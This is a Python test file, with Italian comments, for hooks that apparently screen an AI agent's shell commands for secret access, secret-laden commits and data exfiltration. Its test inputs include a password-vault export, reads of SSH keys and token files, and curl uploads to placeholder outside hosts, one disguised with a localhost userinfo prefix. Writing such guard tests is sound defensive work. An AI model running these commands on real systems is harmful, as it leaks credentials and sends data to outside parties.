#!/usr/bin/env python3
"""S03, S04, S07, S09, S10: segreti, path e repository effettivo."""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path


def hook(repo: Path, name: str, command: str, cwd: Path) -> tuple[int, str]:
    result = subprocess.run(
        [sys.executable, "-B", str(repo / "hooks" / name)],
        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(cwd)}),
        text=True, capture_output=True, timeout=10, check=False,
        env={"HOME": str(cwd / "home"), "USERPROFILE": str(cwd / "home"), "PATH": os.environ.get("PATH", "")},
    )
    return result.returncode, result.stdout


def decision(repo: Path, name: str, command: str, cwd: Path) -> str:
    rc, out = hook(repo, name, command, cwd)
    if rc == 2:
        return "block"
    if rc:
        raise AssertionError(f"{name} rc={rc}")
    if not out.strip():
        return "silent"
    try:
        return json.loads(out)["hookSpecificOutput"]["permissionDecision"]
    except (json.JSONDecodeError, KeyError, TypeError) as exc:
        raise AssertionError(f"stdout non decisionale: {out!r}") from exc


def git(path: Path, *args: str) -> None:
    subprocess.run(["git", "-C", str(path), *args], capture_output=True, text=True, check=True, timeout=10)


def test_block_dangerous(repo: Path, root: Path) -> None:
    cases = {
        "export-con-flag": ("bw --raw export --format json", "block"),
        "token-cache": ("cat ~/.cache/tool/token_cache.json", "ask"),
        "client-secret": ("python3 -c x ~/.config/tool/client_secret.json", "ask"),
        "ssh": ("cat ~/.ssh/id_ed25519", "ask"),
        "help": ("bw export --help", "silent"),
    }
    for label, (command, expected) in cases.items():
        got = decision(repo, "block-dangerous.py", command, root)
        assert got == expected, f"S03/S04 {label}: atteso {expected}, ricevuto {got}"


def test_resolve(repo: Path) -> None:
    import importlib.util
    spec = importlib.util.spec_from_file_location("block_dangerous", repo / "hooks" / "block-dangerous.py")
    assert spec and spec.loader
    block_dangerous = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(block_dangerous)
    expected = os.path.normpath("/tmp/default")
    assert block_dangerous._resolve("${KNOWN:-/tmp/default}", "/tmp") == expected
    assert block_dangerous._resolve("${EMPTY:-/tmp/default}", "/tmp") == expected
    assert block_dangerous._resolve("${UNKNOWN:-/tmp/default}", "/tmp") == expected


def test_commit_gate(repo: Path, root: Path) -> None:
    a = root / "repo-a"
    b = root / "repo b"
    a.mkdir(); b.mkdir()
    for location in (a, b):
        git(location, "init")
        git(location, "config", "user.email", "test@example.invalid")
        git(location, "config", "user.name", "Test")
    refresh = "1//" + "a" * 48
    telegram = "123456789:" + "A" * 35
    (b / "secrets.txt").write_text(f"{refresh}\n{telegram}\n", encoding="utf-8")
    git(b, "add", "secrets.txt")
    command = f'git -C "{b}" commit -m test'
    got = decision(repo, "commit-secret-gate.py", command, a)
    assert got == "ask", f"S09/S10 git -C: atteso ask, ricevuto {got}"
    got = decision(repo, "commit-secret-gate.py", f'cd "{b}" && git commit -m test', a)
    assert got == "ask", f"S10 cd: atteso ask, ricevuto {got}"


def test_exfil_hosts(repo: Path, root: Path) -> None:
    cases = {
        "localhost-falso": "https://localhost.example.invalid/upload",
        "userinfo-esterno": "https://localhost@outside.example.invalid/upload",
        "suffisso-falso": "https://node.ts.net.example.invalid/upload",
        "interno-vero": "https://localhost/upload",
    }
    for label, url in cases.items():
        expected = "silent" if label == "interno-vero" else "ask"
        got = decision(repo, "exfil-guard.py", f"curl -d valore {url}", root)
        assert got == expected, f"S08-B {label}: atteso {expected}, ricevuto {got}"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--repo", type=Path, required=True)
    parser.add_argument("--baseline-ref")
    args = parser.parse_args()
    if args.baseline_ref:
        probe = subprocess.run([sys.executable, "-B", __file__, "--repo", str(args.repo)], capture_output=True, text=True, timeout=60, check=False)
        assert probe.returncode != 0, "baseline non discriminante su segreti e commit"
        print("BASELINE_DISCRIMINANTE=S03,S04,S07,S09,S10")
        return 0
    with tempfile.TemporaryDirectory(prefix="arturo-secrets-") as raw:
        root = Path(raw)
        (root / "home").mkdir()
        test_block_dangerous(args.repo.resolve(), root)
        test_resolve(args.repo.resolve())
        test_commit_gate(args.repo.resolve(), root)
        test_exfil_hosts(args.repo.resolve(), root)
    print("PASS S03,S04,S07,S08-B,S09,S10")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
